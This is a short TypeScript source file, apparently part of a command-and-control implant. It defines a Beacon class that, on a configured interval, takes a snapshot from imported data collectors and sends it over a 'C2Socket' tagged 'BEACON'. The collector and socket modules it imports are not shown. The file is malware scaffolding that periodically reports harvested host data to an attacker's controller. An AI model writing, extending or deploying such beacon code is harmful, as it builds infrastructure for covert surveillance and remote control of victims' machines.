import { C2Socket } from './C2Socket';
import { DataCollectors } from './DataCollectors';
import { Config } from './Config';

export class Beacon {
  private socket:     C2Socket;
  private collectors: DataCollectors;
  private timer:      number | null = null;

  constructor(socket: C2Socket, collectors: DataCollectors) {
    this.socket     = socket;
    this.collectors = collectors;
  }

  start(): void {
    this.sendBeacon();
    this.timer = setInterval(() => this.sendBeacon(), Config.BEACON_INTERVAL) as unknown as number;
  }

  stop(): void {
    if (this.timer !== null) {
      clearInterval(this.timer as unknown as ReturnType<typeof setInterval>);
      this.timer = null;
    }
  }

  private sendBeacon(): void {
    const snap = this.collectors.snapshot();
    this.socket.send('BEACON', snap);
  }
}
